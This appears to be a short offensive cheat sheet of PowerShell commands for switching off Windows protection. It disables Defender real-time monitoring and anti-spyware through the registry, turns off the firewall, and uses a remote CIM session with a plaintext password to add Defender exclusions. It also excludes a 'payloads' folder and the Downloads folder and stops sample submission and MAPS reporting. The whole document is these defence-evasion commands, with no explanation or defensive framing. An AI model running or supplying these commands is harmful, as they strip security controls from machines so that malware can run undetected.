```
powershell Set-MpPreference -DisableRealtimeMonitoring $true 

Set-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0x00000001 -Force 
netsh advfirewall set  currentprofile state off 
```

# Remote Configuration
```
$sessopt = New-CimSessionOption -Protocol DCOM
$secpasswd = ConvertTo-SecureString “PlainTextPassword” -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential (“username”, $secpasswd)
$sess = New-CIMSession -ComputerName 192.168.100.199 -Credential $creds -SessionOption $sessopt
Set-MpPreference -CimSession $sess -ExclusionPath C:\Temp -ExclusionExtension exe
```
# Exclusion Folder 
```
# 
Add-MpPreference -ExclusionPath "C:\Windows\Temp\"
Add-MpPreference -ExclusionPath "C:\Windows\Tasks\payloads\"
$Downloads = Get-ItemPropertyValue 'HKCU:\software\microsoft\windows\currentversion\explorer\shell folders\' -Name '{374DE290-123F-4565-9164-39C4925E467B}'
Add-MpPreference -ExclusionPath $Downloads
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend
```
